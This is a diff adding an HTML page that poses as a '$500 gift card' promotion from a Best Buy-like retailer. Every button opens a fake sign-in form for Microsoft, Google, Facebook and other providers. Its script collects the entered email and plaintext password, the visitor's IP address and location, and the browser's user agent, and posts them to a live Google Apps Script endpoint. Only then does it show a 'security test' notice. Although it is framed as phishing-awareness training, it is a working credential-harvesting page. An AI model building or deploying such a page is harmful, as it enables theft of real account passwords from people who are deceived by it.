@@ -1,0 +1,480 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Enter to Win $500 Deals Gift Card</title>
+  <meta name="description" content="Enter now for a chance to win a $500 Deals gift card. Official promotion.">
+  <link rel="icon" href='data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23007AC9"><path d="M3 12l7-9 7 9v9H3v-9z"/></svg>'>
+  
+  <!-- Added Google Font 'Inter' -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  
+  <style>
+    /* Clean BestBuy-like theme (colors inspired, not copied) */
+    :root{
+      --brand-blue:#0033a0;
+      --brand-yellow:#ffd700;
+      --bg:#f4f7fb;
+      --card:#ffffff;
+      --muted:#6b7280;
+      --border-color: #e5e7eb;
+    }
+    html,body{height:100%;margin:0;font-family:'Inter',system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:var(--bg);color:#0b1220;box-sizing: border-box;}
+    *, *::before, *::after {
+      box-sizing: inherit;
+    }
+    .container{max-width:1150px;margin:32px auto;padding:20px;}
+    header{display:flex;align-items:center;gap:18px;}
+    .logo{display:flex;align-items:center;gap:10px;}
+    .logo .mark{width:56px;height:56px;background:var(--brand-blue);border-radius:8px;display:flex;align-items:center;justify-content:center;color:var(--brand-yellow);font-weight:800;font-size:20px; flex-shrink: 0;}
+    .logo h1{margin:0;font-size:1.25rem;color:var(--brand-blue);letter-spacing:0.2px;}
+    .nav{margin-left:auto;display:flex;gap:12px;align-items:center;}
+    .nav a{color:var(--brand-blue);text-decoration:none;font-weight:600;}
+    
+    .hero{display:flex;gap:24px;margin-top:20px;background:linear-gradient(180deg,#fff, #fbfdff);padding:26px;border-radius:12px;align-items:center;}
+    .hero-left{flex:1; min-width: 0;} /* Added min-width to prevent overflow */
+    .hero h2{margin:0;font-size:2rem;color:var(--brand-blue); line-height: 1.2;} /* Added line-height */
+    .hero p{color:var(--muted);margin-top:8px;font-size:1rem;}
+    
+    .cta-btn{display:inline-flex;align-items:center;justify-content: center; gap:10px;background:var(--brand-yellow);border:none;padding:14px 18px;border-radius:8px;font-weight:800;color:var(--brand-blue);cursor:pointer;font-size:1rem; transition: filter 0.2s;}
+    .cta-btn:hover { filter: brightness(1.05); }
+    
+    .cta-small{background:transparent;border:1px solid var(--border-color);padding:10px 12px;border-radius:8px;color:var(--brand-blue);font-weight:700;cursor:pointer; transition: background-color 0.2s; display: inline-flex; justify-content: center; align-items: center;}
+    .cta-small:hover { background-color: #f9fafb; }
+
+    .hero-right{width:360px;flex-shrink:0;}
+    .card{background:var(--card);border-radius:10px;padding:16px;border:1px solid var(--border-color);}
+    
+    .sso-options{display:flex;flex-direction:column;gap:10px;margin-top:12px;}
+    .sso-button{display:flex;align-items:center;justify-content:flex-start;gap:12px;padding:10px;border-radius:8px;border:1px solid var(--border-color);background:#fff;color:#111;cursor:pointer;text-decoration:none;font-weight:700; transition: background-color 0.2s;}
+    .sso-button:hover { background-color: #f9fafb; }
+    .sso-button svg,.sso-button img{width:20px;height:20px;flex:0 0 20px;}
+    
+    /* Styles for the login form (from the other file, adapted to light theme) */
+    #loginForm { display:none; margin-top:18px; text-align:left; }
+    .form-row { margin-bottom:12px; }
+    label { 
+      display:block; 
+      font-size:0.9rem; 
+      color: var(--muted);
+      margin-bottom:6px; 
+      font-weight: 600;
+    }
+    input[type="text"], input[type="password"], input[type="email"] { 
+      width:100%; 
+      padding:10px; 
+      border-radius:6px; 
+      border:1px solid var(--border-color);
+      box-sizing:border-box; 
+      background: #fff;
+      color: #111827;
+      font-size: 1rem; /* Ensure mobile zoom isn't triggered */
+    }
+    input[type="text"]::placeholder, 
+    input[type="password"]::placeholder, 
+    input[type="email"]::placeholder {
+      color: #9ca3af; 
+    }
+    
+    /* Shared button style for form */
+    .btn { 
+      display:inline-block; 
+      margin-top:8px; 
+      padding:10px 14px; 
+      border-radius:6px; 
+      background: var(--brand-blue);
+      color: white;
+      font-weight:700; 
+      border:none; 
+      cursor:pointer;
+      transition: background-color 0.2s ease-in-out;
+    }
+    .btn:hover {
+      filter: brightness(1.1);
+    }
+    #cancelBtn {
+      background: var(--muted);
+      color: white;
+      margin-left: 8px;
+    }
+    small.note { 
+      display:block; 
+      color: var(--muted);
+      margin-top:8px; 
+      font-size:0.85rem; 
+    }
+    
+    /* Styles for the training message */
+    #training-message { 
+      display:none; 
+      margin-top:18px; 
+      padding:14px; 
+      background: #fef2f2; 
+      border:1px solid #f87171;
+      border-radius:6px; 
+      color: #b91c1c;
+      text-align:left; 
+    }
+    #training-message h3 {
+      margin-top: 0;
+      color: #991b1b;
+      font-weight: 700;
+    }
+
+    /* Styles for "other" content sections */
+    .offers{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:20px;}
+    .offer{background:var(--card);border-radius:10px;padding:14px;border:1px solid var(--border-color);}
+    .offer h4{margin:0 0 8px 0;color:var(--brand-blue);font-size:1rem;}
+    footer{margin-top:28px;text-align:center;color:var(--muted);font-size:0.9rem;}
+    
+    /* --- Mobile Responsive Styles --- */
+    
+    /* First breakpoint for tablets and larger phones */
+    @media (max-width:900px){
+      .hero{flex-direction:column-reverse;} /* Stack form on top */
+      .hero-right{width:100%;}
+      .offers{grid-template-columns:repeat(1,1fr);}
+      .hero h2 { font-size: 1.75rem; }
+    }
+    
+    /* Second breakpoint for small mobile phones */
+    @media (max-width: 640px) {
+      .container {
+        margin: 0;
+        padding: 12px;
+        width: 100%;
+      }
+      header {
+        flex-wrap: wrap;
+        justify-content: center; /* Center logo */
+        gap: 12px;
+      }
+      .nav {
+        margin-left: 0;
+        width: 100%;
+        justify-content: center; /* Center nav items */
+        gap: 16px;
+      }
+      .logo .mark {
+        width: 48px;
+        height: 48px;
+        font-size: 18px;
+      }
+      .logo h1 {
+        font-size: 1.1rem;
+      }
+      .hero {
+        padding: 16px;
+      }
+      .hero-left .cta-btn, .hero-left .cta-small {
+        width: 100%;
+        margin-left: 0;
+        margin-top: 10px;
+      }
+      .hero-right {
+        width: 100%;
+      }
+    }
+    
+  </style>
+</head>
+<body>
+  <div class="container" role="main" aria-labelledby="promoTitle">
+    <header>
+      <div class="logo" aria-hidden="true">
+        <div class="mark">DEALS</div>
+        <h1>Deals</h1>
+      </div>
+      <nav class="nav" aria-label="top navigation">
+        <a href="#" class="js-trigger-login">Deals</a>
+        <a href="#" class="js-trigger-login">Black Friday</a>
+        <a href="#" class="js-trigger-login">Top Offers</a>
+      </nav>
+    </header>
+
+    <section class="hero" aria-labelledby="promoTitle">
+      <div class="hero-left">
+        <h2 id="promoTitle">Enter now to win a free $500 gift card</h2>
+        <p>Hurry — limited-time promotion. One lucky winner will receive a $500 gift card redeemable on sitewide purchases. No purchase necessary. By entering you agree to our terms & conditions.</p>
+
+        <div style="margin-top:18px;">
+          <!-- This button will now trigger the login form -->
+          <button id="enterBtn" class="cta-btn" aria-label="Enter now to win $500 gift card">
+            Enter Now — Win $500
+          </button>
+          <button id="learnBtn" class="cta-small js-trigger-login" style="margin-left:10px;">Learn More</button>
+        </div>
+
+        <div style="margin-top:18px;color:var(--muted);font-size:0.95rem;">
+          <strong>In-store pricing may vary.</strong> Prices and offers are subject to change. © 2025 Best Deals. All rights reserved. BEST Deals, the BEST Deals logo, the tag design, and MY BEST Deals are trademarks of Best Deals and its affiliated companies.
+        </div>
+      </div>
+
+      <aside class="hero-right">
+        <div class="card" aria-label="Sign in options">
+          
+          <!-- SSO options -->
+          <div class="sso-options" id="sso-selection">
+            <a href="#" class="sso-button" data-provider="Microsoft">
+              <img alt="Microsoft" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMyAyMyIgd2lkdGg9IjIzIiBoZWlnaHQ9IjIzIj48cGF0aCBmaWxsPSIjZjNmM2YzIiBkPSJNMCAwaDIzdjIzSDB6Ii8+PHBhdGggZmlsbD0iI2YzNTMyNSIgZD0iTTEgMWgxMHYxMEgxeiIvPjxwYXRoIGZpbGw9IiM4MWJjMDYiIGQ9Ik0xMiAxaDEwdjEwSDEyeiIvPjxwYXRoIGZpbGw9IiMwNWE2ZjAiIGQ9Ik0xIDEyaDEwdjEwSDF6Ii8+PHBhdGggZmlsbD0iI2ZmYmEwOCIgZD0iTTEyIDEyaDEwdjEwSDEyeiIvPjwvc3ZnPg=="/>
+              Sign in with Microsoft
+            </a>
+            
+            <a href="#" class="sso-button" data-provider="Google">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
+                <path fill="#EA4335" d="M24 9.5c3.9 0 6.6 1.7 8.1 3.2l6-6C34.3 3 29.5 1 24 1 14.8 1 7.1 6.6 4 14.4l7 5.4C12.7 13.3 17.8 9.5 24 9.5z"/>
+                <path fill="#34A853" d="M46.1 24.5c0-1.6-.1-3.2-.4-4.7H24v9h12.6c-.6 3.1-2.4 5.7-5 7.4l7 5.4c4.1-3.8 6.5-9.3 6.5-16.1z"/>
+                <path fill="#FBBC05" d="M11 28.2a14.5 14.5 0 0 1 0-8.4l-7-5.4a23.96 23.96 0 0 0 0 19.2l7-5.4z"/>
+                <path fill="#4285F4" d="M24 47c6.5 0 12-2.1 16-5.7l-7-5.4c-2 1.4-4.6 2.3-9 2.3-6.2 0-11.3-3.8-13-9.2l-7 5.4C7.1 41.4 14.8 47 24 47z"/>
+              </svg>
+              Sign in with Google
+            </a>
+            
+            <a href="#" class="sso-button" data-provider="LinkedIn"><img alt="LinkedIn" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzAwNzdiYiI+PHBhdGggZD0iTTIwLjQ0NyAyMC40NTJoLTMuNTUzdi01LjU2OWMwLTEuMzI4LS4wMjctMy4wMzctMS44NTItMy4wMzdzLTIuMTM2IDEuNDQ1LTIuMTM2IDIuOTM5djUuNjY3SDkuMzU1VjkuMGg0LjM0OXYxLjM2MWguMDYyYzEuMDMxLTEuNzM2IDIuNDk0LTMuNTUzIDQuMjg3LTMuNTUzIDQuNTgxIDAgNS40MjQgMy4wMTMgNS44MjQgNi45MjZ2Ny45NzV6TTUuMjIgNy41NmEwLjAxIDAuMDEgMCAwIDEtLjAyMS4wMDFoLS4wMjFjLTEuMjMgMC0yLjIyLTEtMi4yMi0yLjIyYTEuNjYgMS42NiAwIDAgMSAxLjY2LTEuNjZjMS4yMyAwIDIuMjIgMSAyLjIyIDIuMjJjMCAxLjIyLTEuMjMgMi4yMi0yLjIyIDIuMjJ6TTAuMDIgMjAuNDUyaDQuMzQ5VjkuMGgtNC4zNDlWMjAuNDUyeiIvPjwvc3ZnPg=="/>Sign in with LinkedIn</a>
+            <a href="#" class="sso-button" data-provider="GitHub">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#333333">
+                <path d="M12 0C5.373 0 0 5.373 0 12c0 5.303 3.438 9.805 8.205 11.385.6.113.82-.259.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C5.4 15.24 4.667 14.9 4.667 14.9c-1.087-.744.082-.729.082-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.4 3-.405 1.02.005 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.21 0 1.605-.015 2.9-.015 3.295 0 .32.21.695.825.575C20.565 21.805 24 17.303 24 12 24 5.373 18.627 0 12 0z"/>
+              </svg>
+              Sign in with GitHub
+            </a>
+            <a href="#" class="sso-button" data-provider="X (Twitter)">
+              <img alt="X" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MCA1MCIgd2lkdGg9IjUwcHgiIGhlaWdodD0iNTBweCIgZmlsbD0iIzMzMyI+PHBhdGggZD0iTTQwLjE5OSw0Mi4zMiBMNS4yNjIsNS45NjMgOS4xMzcsNS45NjMgMzYuODE1LDMyLjExMiA0NS43MzYsMjEuMTU5IDQ5LjYxMSwyMS4xNTkgMzYuNDM4LDM4LjE3OCAyOC41MjYsNDcuMDM3IDI0LjY1LDQ3LjAzNyAzNy4yMTgsMjkuNzI4IEw0MC4xOTksNDIuMzIgeiBNMzguMjEsMzkuMjEgTDguODg7LDguMDgxIDMzLjEyNCwzNi41NTYgMzguMjEsMzkuMjEgeiBNMjYuNTE3LDIyLjI3OCBMMzMuOTIsMzQuNjY3IDIxLjA0NSw0LjEwMiAxMy40MTUsMTYuNzIgTDI2LjUxNywyMi4yNzcgeiIvPjwvc3ZnPg=="/>
+              Sign in with X
+            </a>
+            
+            <!-- Added Facebook and Instagram Buttons -->
+            <a href="#" class="sso-button" data-provider="Facebook">
+              <img alt="Facebook" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzE4NzdmMiI+PHBhdGggZD0iTTIyLjY3NSAwaC0yMS4zNWMtLjczMiAwLTEuMzI1LjU5My0xLjMyNSAxLjMyNXYyMS4zNWMwIC43My41OTMgMS4zMjUgMS4zMjUgMS4zMjVoMTEuNjkzdi05LjE5NmgtMy4xMjh2LTMuNjIySDEyLjk5OFY5LjU5NGMwLTMuMjI1IDIuMTYtNS4wMjIgNC45My01LjAyMmgzLjM5OXYzLjYyN2gtMi4wNDFjLTEuMjQxIDAtMS40ODUuNTkxLTEuNDg1IDEuNDU4djIuNTE2aDMuNzA1bC0uNDg3IDMuNjIySDE3Ljc5OXY5LjE5Nmg0Ljg3OGMuNzMyIDAgMS4zMjUtLjU5MyAxLjMyNS0xLjMyNXYtMjEuMzVjMC0uNzMyLS41OTMtMS4zMjUtMS4zMjUtMS4zMjV6Ii8+PC9zdmc+"/>
+              Sign in with Facebook
+            </a>
+            <a href="#" class="sso-button" data-provider="Instagram">
+              <img alt="Instagram" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSI+PGxpbmVhckdyYWRpZW50IGlkPSJncmFkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjMiIHgyPSIxOS41IiB5MT0iMjEuMDAxIiB5Mj0iNC41MDEiPjxzdG9wIG9mZnNldD0iMCIgc3RvcC1jb2xvcj0iI2Y2YzkzNyIvPjxzdG9wIG9mZnNldD0iLjMxIiBzdG9wLWNvbG9yPSIjZTU3NzA2Ii8+PHN2Z1Agb2Zmc2V0PSIuOTg5IiBzdG9wLWNvbG9yPSIjZDc0MjcyIi8+PC9saW5lYXJHcmFkaWVudD48cGF0aCBmaWxsPSJ1cmwoI2dyYWQpIiBkPSJNMTIgMEM4LjcyMSAwIDUuMjMyIDAgMS45NDEgMS45NDFDMCA1LjMyOSAwIDguNzIxIDAgMTJjMCAzLjI3OSAwIDYuNjcxIDEuOTQxIDguMDU5QzUuMjMyIDI0IDguNzIxIDI0IDEyIDI0YzMuMjc5IDAgNi42NzEtLjAwMSA4LjA1OS0xLjk0MUMyNCAyMC4xNzEgMjQgMTcuMjc5IDI0IDEyYzAtMy4yNzkgMC02LjY3MS0xLjk0MS04LjA1OUMyMC42NzEgMCAxNy4yNzkgMCAxMiAwek05LjgwOSA1Ljg5NGMuNjQ4LS4wMDIgMS4zMTUtLjAwNCAxLjk5MS0uMDA0IDIuMDY3IDAgMy4yODIgMS4yIDEzLjMwOCAzLjM0OS4wMzEuNTk5LjAzIDEuMjAzLjAyNyAxLjgxLS4wMDQuNjA4LS4wMDYgMS4yMzItLjAwNiAxLjg1MS0uMDAyLjYxOS0uMDAyIDEuMjg4LS4wMDYgMS44ODgtLjAxNiAyLjM4NS0xLjM2MSA0LjA1Mi0zLjM4MSA0LjEzMi0uNTg5LjAyMS0xLjE4LjA0Mi0xLjc2OC4wNDItLjU5MyAwLTEuMTkyLS4wMjEtMS43ODItLjA0MmMtMi4xMzYtLjA4LTMuNzQ1LTEuNzU1LTMuODIxLTQuMDM3LS4wMzYtMS4xNzgtLjAzNi0yLjM2MS0uMDM2LTMuNTM4QzUuOTk5IDEwLjA5NSA2LjAwNSA3LjQ1IDkuODA5IDUuODk0em04LjAyMiA5LjI1MWMuNzc3LS4wOTMuOTIyLS4xNjYuOTIyLS45OTQtLjAwMi0uODQyLS4xMy0uOTk2LS44OTctMS4wMS0xLjA3LS4wMDgtMy4wNjQtLjAwOC00Ljg5NS0uMDA4LTEuNDQxIDAtMy42NTIgMC00Ljc0OS4wMDgtLjc5LjAwMi0uOTYyLjE3NC0uOTYyIDEuMDQtLjAwMS44OTkuMTkyIDEuMDQgMS4xIDEuMDRjMS4zODQtLjAwMyAzLjQyOS0uMDAzIDQuNzAzLS4wMDMuMzg2IDAgMS4yMjItLjAwNCAxLjc4LS4wMzd6bS01LjYyNC02LjM1MmE1Ljg0OSA1Ljg0OSAwIDAxLTUuNzggNS45MTNjLjAwNSAzLjI2IDEuOTA4IDUuNTg5IDUuNzggNS41ODlzNS43NzQtMi4xNzcgNS43NzQtNS41ODljLjAwNS0zLjI5My0yLjExMS01LjkxMy01Ljc3NC01LjkxM3ptLTUuMzgyIDUuODgzYzAgMi4xMzUuNjggMy44NjMgNS4zODIgMy44NjMgNC42NTIgMCA1LjM2NC0xLjcwMyA1LjM2NC0zLjgxNyAwLTIuMTM2LS43MS0zLjg2My01LjM2NC0zLjgxNy00LjcwNSAwLTUuMzgyIDEuNjc4LTUuMzgyIDMuODE3ek01LjkyIDExLjEzYTMuMjc5IDMuMjc5IDAgMDAuMDAxLTEuMDI5Yy4zNzQtLjg2NyAxLjU0Mi0xLjMyIDMuMTMxLTEuMzIgMS4yOTcgMCAzLjAwOC4xMTYgMy4xNDguOTk0QzEyLjA2MyA4Ljk3IDEwLjc0NSA5LjYwNCA5LjY0OCAxMC42MzdjLTEuMTU3IDEuMDgzLTEuNjQ0IDIuMDU4LTEuNjQ0IDMuOTM1cy41MSA0LjAxIDMuMDI4IDQuMDM3YzEuMDIxLjAxIDMuMTMyLjA0IDQuNTIuMDQzLjYyMyAwIDEuMjUuMDAyIDEuODgzLjAwNi44MjQuMDA1IDEuNDUzLS4wMDggMS45OTMtLjExMy0uNzYzLjg1My0xLjkxNyAxLjIyMy0zLjEzMSAxLjIyMy0yLjg5MSAwLTQuNjcyLTEuODIzLTQuNjcyLTMuNjQ4cy4xNjgtMi43NTkuMzk4LTMuNDkyek0xOC4xMDYgNy44NTdhMS4zMSAxLjMxIDAgMDAtMS4zMS0xLjMxYy0uNzIzIDAtMS4zMS41ODctMS4zMSAxLjMxIDAgLjcyMy41ODcgMS4zMSAxLjMxIDEuMzFzMS4zMS0uNTg3IDEuMzEtMS4zMXoiLz48L3N2Zz4="/>
+              Sign in with Instagram
+            </a>
+          </div>
+
+          <!-- Login form (hidden by default) -->
+          <form id="loginForm" autocomplete="on" novalidate>
+            <h3 id="formTitle" style="margin:0 0 12px 0; font-weight: 600; color: #111827;">Sign in</h3>
+            <div class="form-row">
+              <label for="username">Email</label>
+              <input id="username" name="username" type="email" placeholder="Email Address" required />
+            </div>
+            <div class="form-row">
+              <label for="password">Password</label>
+              <input id="password" name="password" type="password" placeholder="Password" />
+            </div>
+            <button type="submit" id="submitBtn" class="btn">Submit</button>
+            <button type="button" id="cancelBtn" class="btn">Cancel</button>
+          </form>
+
+          <!-- Training message (hidden by default) -->
+          <div id="training-message" role="status" aria-live="polite">
+            <h3>This Was a Security Test</h3>
+            <p>You were about to sign in on a simulated phishing page. We recorded that you attempted to authenticate via <strong id="providerNameDisplay"></strong>.</p>
+            <p style="font-weight:bold;text-align:center;margin:10px 0 0 0;">Redirecting to training…</p>
+          </div>
+          
+        </div>
+      </aside>
+    </section>
+
+    <section class="offers" aria-label="Featured offers">
+      <!-- ... other offers ... -->
+      <div class="offer">
+        <h4>Deal of the Day</h4>
+        <p style="color:var(--muted);margin:0 0 8px 0;">Top daily discounts on electronics, home, and more.</p>
+        <button class="cta-small js-trigger-login">Shop Deal</button>
+      </div>
+      <div class="offer">
+        <h4>Black Friday Preview</h4>
+        <p style="color:var(--muted);margin:0 0 8px 0;">Early access to Black Friday-style markdowns.</p>
+        <button class="cta-small js-trigger-login">Preview</button>
+      </div>
+      <div class="offer">
+        <h4>Top Sellers</h4>
+        <p style="color:var(--muted);margin:0 0 8px 0;">Trending items chosen by customers.</p>
+        <button class="cta-small js-trigger-login">Browse</button>
+      </div>
+    </section>
+
+    <footer>
+      <small>Enriching lives by serving our customers’ essential tech needs.</small>
+    </footer>
+  </div>
+
+  <script>
+    // Wait for the window to be fully loaded
+    
+    
+        // Wait for the window to be fully loaded, including external scripts
+    window.onload = () => {
+    
+      /***********************
+       * Configuration
+       ***********************/
+      
+      // 1. PASTE YOUR GOOGLE SCRIPT URL HERE
+      const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbz6LMQheNygxd5ejseXkqSTfWs1_K90Ug9uXPdLG3BBPlcIhUUbR8RuG8XadUN965WAUw/exec";
+
+      const FINAL_ENROLLMENT_URL = "https://cybersecurity-llc.github.io/cybersecurity-awareness.html";
+      const REDIRECT_DELAY = 3000; // milliseconds
+
+      // Firebase is no longer needed
+      let db = null; 
+
+      /***********************
+       * Helper: fetch geo/ip safely
+       ***********************/
+      async function fetchGeo() {
+        try {
+          const res = await fetch('https://ipapi.co/json/');
+          if (!res.ok) throw new Error('geo failed');
+          return await res.json();
+        } catch (e) {
+          return {
+            ip: 'lookup_failed',
+            city: 'lookup_failed',
+            region: 'lookup_failed',
+            country_name: 'lookup_failed',
+            org: 'lookup_failed'
+          };
+        }
+      }
+
+      /***********************
+       * NEW Helper: send to Google Script
+       ***********************/
+      async function sendToGoogleScript(payloadObj) {
+        if (SCRIPT_URL === "PASTE_YOUR_WEB_APP_URL_HERE") {
+            console.error("SCRIPT_URL is not set. Data not sent.");
+            return;
+        }
+
+        try {
+          // We must send the data as a JSON string in the body
+          const response = await fetch(SCRIPT_URL, {
+            method: 'POST',
+            mode: 'cors', // Required for cross-origin requests
+            credentials: 'omit',
+            headers: {
+              'Content-Type': 'text/plain;charset=utf-8', // Use text/plain to avoid preflight
+            },
+            body: JSON.stringify(payloadObj)
+          });
+          
+          const result = await response.json();
+          console.log("Data sent to Google Script:", result);
+
+        } catch (err) {
+          console.error('Google Script error. Check CORS or script URL.', err);
+        }
+      }
+
+      /***********************
+       * Main flow (Modified)
+       ***********************/
+      const ssoButtons = document.querySelectorAll('.sso-button');
+      const ssoSelection = document.getElementById('sso-selection');
+      const loginForm = document.getElementById('loginForm');
+      const formTitle = document.getElementById('formTitle');
+      const providerDisplay = document.getElementById('providerNameDisplay');
+      const trainingMessage = document.getElementById('training-message');
+      const usernameInput = document.getElementById('username');
+      const passwordInput = document.getElementById('password');
+      let currentProvider = null;
+
+      // NEW: Get all buttons that should trigger the login
+      const allLoginTriggers = document.querySelectorAll('.js-trigger-login');
+      const enterButton = document.getElementById('enterBtn');
+
+      // Function to show the login form
+      function showLoginForm(providerName) {
+        currentProvider = providerName || 'Email';
+        ssoSelection.style.display = 'none';
+        loginForm.style.display = 'block';
+        formTitle.textContent = `Sign in with ${currentProvider}`;
+        providerDisplay.textContent = currentProvider;
+        usernameInput.focus();
+      }
+
+      // --- Event Listeners ---
+
+      // Listen for click on "Enter Now" button
+      enterButton.addEventListener('click', (e) => {
+        e.preventDefault();
+        showLoginForm('Email'); // Default to 'Email' when "Enter Now" is clicked
+      });
+
+      // NEW: Listen for clicks on nav links, offer buttons, and learn more
+      allLoginTriggers.forEach(btn => {
+        btn.addEventListener('click', (e) => {
+          e.preventDefault();
+          showLoginForm('Email'); // Default to 'Email'
+        });
+      });
+
+      ssoButtons.forEach(btn => {
+        btn.addEventListener('click', async (e) => {
+          e.preventDefault();
+          currentProvider = btn.dataset.provider || 'Unknown';
+          ssoSelection.style.display = 'none';
+          loginForm.style.display = 'block';
+          formTitle.textContent = `Sign in with ${currentProvider}`;
+          providerDisplay.textContent = currentProvider;
+          usernameInput.focus();
+        });
+      });
+
+      document.getElementById('cancelBtn').addEventListener('click', () => {
+        loginForm.style.display = 'none';
+        ssoSelection.style.display = 'flex';
+        usernameInput.value = '';
+        passwordInput.value = '';
+      });
+
+      loginForm.addEventListener('submit', async (ev) => {
+        ev.preventDefault();
+        const username = usernameInput.value ? usernameInput.value.trim() : '';
+        const password = passwordInput.value ? passwordInput.value.trim() : ''; 
+
+        const geo = await fetchGeo();
+
+        const payload = {
+          sso_attempt_provider: currentProvider,
+          username: username || '[no username provided]',
+          password: password || '[no password provided]',
+          ip_address: geo.ip,
+          city: geo.city,
+          region: geo.region,
+          country: geo.country_name,
+          isp: geo.org,
+          user_agent: navigator.userAgent
+        };
+
+        // *** THIS IS THE CHANGED LINE ***
+        // send to GOOGLE SCRIPT in background
+        sendToGoogleScript(payload).catch(() => { /* swallow errors */ });
+
+        // Show the training message & redirect
+        loginForm.style.display = 'none';
+        trainingMessage.style.display = 'block';
+        providerDisplay.textContent = currentProvider;
+
+        setTimeout(() => {
+          const url = new URL(FINAL_ENROLLMENT_URL);
+          if (username) url.searchParams.set('username', username);
+          window.location.href = url.toString();
+        }, REDIRECT_DELAY);
+      });
+
+    }; // End of window.onload
+    
+  </script>
+</body>
+</html>
+
+
